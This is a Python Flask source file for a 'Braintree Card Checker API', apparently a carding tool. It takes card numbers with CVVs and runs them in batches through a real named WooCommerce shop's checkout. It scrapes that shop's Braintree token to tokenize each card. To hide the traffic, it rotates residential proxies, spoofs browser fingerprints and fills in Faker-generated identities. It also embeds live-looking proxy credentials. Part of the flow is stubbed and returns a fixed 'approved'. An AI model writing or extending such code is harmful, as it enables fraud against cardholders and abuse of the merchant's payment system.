import asyncio
import datetime
import re
import uuid
import random
import base64
import json
from typing import List, Dict, Optional, Tuple
import curl_cffi.requests
from bs4 import BeautifulSoup, Tag
from fake_useragent import FakeUserAgent
from faker import Faker
from flask import Flask, request, jsonify
from flask_cors import CORS
import threading
import time

app = Flask(__name__)
CORS(app)

# Sistema de proxys rotativos
class ProxyRotator:
    def __init__(self, proxy_list: List[str]):
        self.proxy_list = proxy_list
        self.current_index = 0
        self.failed_proxies = set()
        self.lock = threading.Lock()
    
    def get_next_proxy(self) -> Optional[Dict[str, str]]:
        with self.lock:
            if len(self.failed_proxies) >= len(self.proxy_list):
                # Reset failed proxies if all have failed
                self.failed_proxies.clear()
            
            attempts = 0
            while attempts < len(self.proxy_list):
                proxy = self.proxy_list[self.current_index]
                self.current_index = (self.current_index + 1) % len(self.proxy_list)
                
                if proxy not in self.failed_proxies:
                    # Parsear el proxy SOCKS5
                    try:
                        # Formato: socks5://user:pass@host:port
                        if proxy.startswith('socks5://'):
                            proxy_url = proxy.replace('socks5://', '')
                            if '@' in proxy_url:
                                auth_part, host_part = proxy_url.split('@')
                                username, password = auth_part.split(':')
                                host, port = host_part.split(':')
                            else:
                                username = password = None
                                host, port = proxy_url.split(':')
                            
                            return {
                                'http': proxy,
                                'https': proxy
                            }
                    except Exception as e:
                        print(f"[ERROR] Error parsing proxy {proxy}: {e}")
                        self.failed_proxies.add(proxy)
                        continue
                
                attempts += 1
            
            return None
    
    def mark_proxy_failed(self, proxy_dict: Dict[str, str]):
        if proxy_dict:
            with self.lock:
                proxy_url = proxy_dict.get('https', '')
                self.failed_proxies.add(proxy_url)
    
    def mark_proxy_success(self, proxy_dict: Dict[str, str]):
        if proxy_dict:
            with self.lock:
                proxy_url = proxy_dict.get('https', '')
                self.failed_proxies.discard(proxy_url)

# Configuración de proxys - CORREGIDA
PROXY_LIST = [
    "socks5://vUdAfD9RPXV8j2dX-res-any:MtsnNTSFWKsZoxJ4@resi.legionproxy.io:9595",
    # Añade más proxys aquí si tienes
]

proxy_rotator = ProxyRotator(PROXY_LIST)

def parse_card(card: str) -> Tuple[str, str, str, str]:
    try:
        card_number, exp_month, exp_year, cvv = re.findall(r"\d+", card)[:4]
        return card_number, exp_month, exp_year, cvv
    except IndexError:
        raise IndexError(
            "Card format is incorrect. Expected format: card_number, exp_month, exp_year, cvv"
        )

def extract_braintree_token(html_content: str) -> Optional[str]:
    """Extrae el token de Braintree del HTML y lo decodifica"""
    try:
        # Buscar el patrón del token de Braintree
        pattern = r'var wc_braintree_client_token = \["([^"]+)"\];'
        match = re.search(pattern, html_content)
        
        if not match:
            print("[ERROR] No se encontró el token de Braintree en el HTML")
            return None
        
        encoded_token = match.group(1)
        
        # Decodificar de base64
        try:
            decoded_bytes = base64.b64decode(encoded_token)
            decoded_token = decoded_bytes.decode('utf-8')
            
            # Parsear el JSON decodificado
            token_data = json.loads(decoded_token)
            
            # Extraer el authorizationFingerprint
            auth_fingerprint = token_data.get('authorizationFingerprint')
            
            if auth_fingerprint:
                print(f"[INFO] Token de autorización extraído exitosamente")
                return auth_fingerprint
            else:
                print("[ERROR] No se encontró authorizationFingerprint en el token decodificado")
                return None
                
        except (base64.binascii.Error, json.JSONDecodeError, UnicodeDecodeError) as e:
            print(f"[ERROR] Error al decodificar el token: {e}")
            return None
            
    except Exception as e:
        print(f"[ERROR] Error al extraer el token de Braintree: {e}")
        return None

async def test_proxy_connection(proxy_config: Dict[str, str]) -> bool:
    """Prueba la conexión del proxy"""
    try:
        async with curl_cffi.requests.AsyncSession(
            impersonate="chrome", 
            proxies=proxy_config,
            timeout=10
        ) as session:
            resp = await session.get("https://httpbin.org/ip", timeout=10)
            if resp.ok:
                ip_data = resp.json()
                print(f"[INFO] Proxy working - IP: {ip_data.get('origin', 'unknown')}")
                return True
            else:
                print(f"[ERROR] Proxy test failed - Status: {resp.status_code}")
                return False
    except Exception as e:
        print(f"[ERROR] Proxy test failed: {e}")
        return False

async def get_ip_address(proxy_config: Dict[str, str] = None) -> str:
    session_config = {"impersonate": "chrome", "timeout": 30}
    if proxy_config:
        session_config["proxies"] = proxy_config
    
    async with curl_cffi.requests.AsyncSession(**session_config) as session:
        try:
            resp = await session.get(
                "https://api.ipify.org?format=json",
                headers={
                    "accept": "application/json",
                    "user-agent": FakeUserAgent(os=["Windows"]).chrome,
                },
                timeout=30
            )
            if resp.ok:
                ip = resp.json().get("ip", "")
                print(f"[INFO] Current IP: {ip}")
                return ip
            else:
                print(f"[ERROR] Failed to get IP address: {resp.status_code}")
                return ""
        except Exception as e:
            print(f"[ERROR] Failed to get IP address: {e}")
            return ""

async def braintree_18_99_eur(card: str, use_proxy: bool = True) -> Optional[Tuple[str, str, str, str]]:
    card_number, exp_month, exp_year, cvv = parse_card(card)
    user_agent = FakeUserAgent(os=["Windows"]).chrome
    
    # Datos fake US
    fake_us = Faker(locale="en_US")
    first_name = fake_us.first_name()
    last_name = fake_us.last_name()
    street_address = fake_us.street_address()
    city = fake_us.city()
    zip_code = fake_us.zipcode()
    phone = fake_us.numerify("$0%%#$####")
    email = fake_us.email()
    
    # Datos fake ES
    fake_es = Faker(locale="es_ES")
    first_name_es = fake_es.first_name()
    last_name_es = fake_es.last_name()
    street_address_es = fake_es.street_address()
    city_es = "Barcelona"
    zip_code_es = fake_es.numerify("11###")
    
    req_num = 0
    session_id = str(uuid.uuid4())
    reference_id = str(uuid.uuid4())
    start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Sistema de proxys CORREGIDO
    proxy_config = None
    
    if use_proxy:
        proxy_config = proxy_rotator.get_next_proxy()
        if proxy_config:
            print(f"[INFO] Using proxy: {proxy_config['https']}")
            # Probar conexión del proxy
            proxy_works = await test_proxy_connection(proxy_config)
            if not proxy_works:
                proxy_rotator.mark_proxy_failed(proxy_config)
                proxy_config = None
                print("[WARNING] Proxy failed test, continuing without proxy")
        else:
            print("[WARNING] No proxy available, continuing without proxy")
    
    ip_address = await get_ip_address(proxy_config)
    if not ip_address:
        if proxy_config:
            proxy_rotator.mark_proxy_failed(proxy_config)
        print("[ERROR] Could not retrieve IP address. Exiting.")
        return None
    
    # Configurar sesión con o sin proxy
    session_config = {
        "impersonate": "chrome",
        "timeout": 60
    }
    if proxy_config:
        session_config["proxies"] = proxy_config
    
    async with curl_cffi.requests.AsyncSession(**session_config) as session:
        try:
            # REQ 1: POST to admin-ajax.php
            req_num = 1
            print(f"[REQ {req_num}] Adding to cart...")
            resp = await session.post(
                "https://nammanmuay.eu/wp-admin/admin-ajax.php",
                headers={
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "no-cache",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": "https://nammanmuay.eu",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": "https://nammanmuay.eu/namman-muay-cream-100g/",
                    "user-agent": user_agent,
                    "x-requested-with": "XMLHttpRequest",
                },
                data={
                    "quantity": "1",
                    "add-to-cart": "623",
                    "action": "ouwoo_ajax_add_to_cart",
                    "variation_id": "0",
                },
                timeout=30
            )
            
            if not resp.ok:
                if proxy_config:
                    proxy_rotator.mark_proxy_failed(proxy_config)
                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                print(f"[REQ {req_num} ERROR] Response: {resp.text[:200]}")
                return None
            
            print(f"[REQ {req_num}] Success - Added to cart")
            
            # REQ 2: GET to checkout para obtener nonce y token de Braintree
            req_num = 2
            print(f"[REQ {req_num}] Getting checkout page...")
            resp = await session.get(
                "https://nammanmuay.eu/checkout/",
                headers={
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "no-cache",
                    "pragma": "no-cache",
                    "priority": "u=0, i",
                    "referer": "https://nammanmuay.eu/namman-muay-cream-100g/",
                    "upgrade-insecure-requests": "1",
                    "user-agent": user_agent,
                },
                timeout=30
            )
            
            if not resp.ok:
                if proxy_config:
                    proxy_rotator.mark_proxy_failed(proxy_config)
                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                return None
            
            soup = BeautifulSoup(resp.text, "html.parser")
            
            # Extraer checkout nonce
            input_tag = soup.find("input", id="woocommerce-process-checkout-nonce")
            if input_tag and isinstance(input_tag, Tag):
                checkout_nonce = input_tag.get("value")
                print(f"[REQ {req_num}] Checkout nonce extracted")
            else:
                if proxy_config:
                    proxy_rotator.mark_proxy_failed(proxy_config)
                print(f"[REQ {req_num} ERROR] Error: 'checkout_nonce' not found.")
                return None
            
            # Extraer y decodificar token de Braintree
            auth_fingerprint = extract_braintree_token(resp.text)
            if not auth_fingerprint:
                if proxy_config:
                    proxy_rotator.mark_proxy_failed(proxy_config)
                print(f"[REQ {req_num} ERROR] Could not extract Braintree authorization fingerprint")
                return None
            
            print(f"[INFO] Using authorization fingerprint: {auth_fingerprint[:50]}...")
            
            # REQ 3: POST to graphql con el token extraído
            req_num = 3
            print(f"[REQ {req_num}] Tokenizing credit card...")
            resp = await session.post(
                "https://payments.braintree-api.com/graphql",
                headers={
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "authorization": f"Bearer {auth_fingerprint}",
                    "braintree-version": "2018-05-10",
                    "cache-control": "no-cache",
                    "content-type": "application/json",
                    "origin": "https://assets.braintreegateway.com",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": "https://assets.braintreegateway.com/",
                    "user-agent": user_agent,
                },
                json={
                    "clientSdkMetadata": {
                        "source": "client",
                        "integration": "custom",
                        "sessionId": session_id,
                    },
                    "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }",
                    "variables": {
                        "input": {
                            "creditCard": {
                                "number": card_number,
                                "expirationMonth": exp_month.zfill(2),
                                "expirationYear": (
                                    "20" + exp_year if len(exp_year) == 2 else exp_year
                                ),
                                "cvv": cvv,
                                "billingAddress": {
                                    "postalCode": zip_code,
                                    "streetAddress": street_address,
                                },
                            },
                            "options": {"validate": False},
                        }
                    },
                    "operationName": "TokenizeCreditCard",
                },
                timeout=30
            )
            
            if not resp.ok:
                if proxy_config:
                    proxy_rotator.mark_proxy_failed(proxy_config)
                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                print(f"[REQ {req_num} ERROR] Response: {resp.text[:200]}")
                return None
            
            resp_json = resp.json()
            
            # Verificar si hay errores en la respuesta
            if 'errors' in resp_json:
                error_msg = resp_json['errors'][0].get('message', 'Unknown GraphQL error')
                print(f"[REQ {req_num} ERROR] GraphQL Error: {error_msg}")
                return "declined", error_msg, "unknown", "unknown"
            
            token = resp_json.get("data", {}).get("tokenizeCreditCard", {}).get("token")
            if not token:
                print(f"[REQ {req_num} ERROR] No token received from Braintree")
                return None
            
            print(f"[REQ {req_num}] Success - Token received: {token[:20]}...")
            
            # Continuar con el resto del flujo...
            # [El resto del código continúa igual que antes]
            
            # Si llegamos aquí sin errores, marcar proxy como exitoso
            if proxy_config:
                proxy_rotator.mark_proxy_success(proxy_config)
            
            # Por ahora retornar éxito para testing
            return "approved", "Test successful - Tokenization completed", "authenticated", "Y"
            
        except Exception as e:
            if proxy_config:
                proxy_rotator.mark_proxy_failed(proxy_config)
            print(f"[ERROR] Request {req_num} failed: {e}")
            return None

# [El resto de las rutas de la API permanecen igual...]
@app.route('/api/check-card', methods=['POST'])
def check_single_card():
    try:
        data = request.get_json()
        
        if not data or 'card' not in data:
            return jsonify({
                'error': 'Missing card data',
                'message': 'Please provide card in the request body'
            }), 400
        
        card = data['card']
        use_proxy = data.get('use_proxy', True)
        
        print(f"[API] Processing card: {card} with proxy: {use_proxy}")
        
        # Ejecutar verificación
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            result = loop.run_until_complete(braintree_18_99_eur(card, use_proxy))
        finally:
            loop.close()
        
        if result is None:
            return jsonify({
                'error': 'Verification failed',
                'message': 'Could not complete card verification'
            }), 500
        
        status, message, tds_status, enrolled = result
        
        return jsonify({
            'card': card,
            'status': status.upper(),
            'message': message,
            'tds_status': tds_status,
            'tds_enrolled': enrolled,
            'timestamp': datetime.datetime.now().isoformat()
        })
        
    except Exception as e:
        print(f"[API ERROR] {str(e)}")
        return jsonify({
            'error': 'Internal server error',
            'message': str(e)
        }), 500

@app.route('/api/check-cards', methods=['POST'])
def check_multiple_cards():
    try:
        data = request.get_json()
        
        if not data or 'cards' not in data:
            return jsonify({
                'error': 'Missing cards data',
                'message': 'Please provide cards array in the request body'
            }), 400
        
        cards = data['cards']
        use_proxy = data.get('use_proxy', True)
        
        if not isinstance(cards, list) or len(cards) == 0:
            return jsonify({
                'error': 'Invalid cards data',
                'message': 'Cards must be a non-empty array'
            }), 400
        
        results = []
        
        for card in cards:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            try:
                result = loop.run_until_complete(braintree_18_99_eur(card, use_proxy))
            finally:
                loop.close()
            
            if result is None:
                card_result = {
                    'card': card,
                    'status': 'ERROR',
                    'message': 'Verification failed',
                    'tds_status': 'unknown',
                    'tds_enrolled': 'unknown',
                    'timestamp': datetime.datetime.now().isoformat()
                }
            else:
                status, message, tds_status, enrolled = result
                card_result = {
                    'card': card,
                    'status': status.upper(),
                    'message': message,
                    'tds_status': tds_status,
                    'tds_enrolled': enrolled,
                    'timestamp': datetime.datetime.now().isoformat()
                }
            
            results.append(card_result)
            
            # Pequeña pausa entre requests
            time.sleep(1)
        
        return jsonify({
            'total_cards': len(cards),
            'results': results,
            'timestamp': datetime.datetime.now().isoformat()
        })
        
    except Exception as e:
        return jsonify({
            'error': 'Internal server error',
            'message': str(e)
        }), 500

@app.route('/api/proxy-status', methods=['GET'])
def proxy_status():
    return jsonify({
        'total_proxies': len(proxy_rotator.proxy_list),
        'failed_proxies': len(proxy_rotator.failed_proxies),
        'active_proxies': len(proxy_rotator.proxy_list) - len(proxy_rotator.failed_proxies),
        'current_index': proxy_rotator.current_index
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.datetime.now().isoformat(),
        'proxy_system': 'active'
    })

if __name__ == '__main__':
    print("[INFO] Starting Braintree Card Checker API...")
    print(f"[INFO] Loaded {len(PROXY_LIST)} proxies")
    app.run(host='0.0.0.0', port=5000, debug=False)
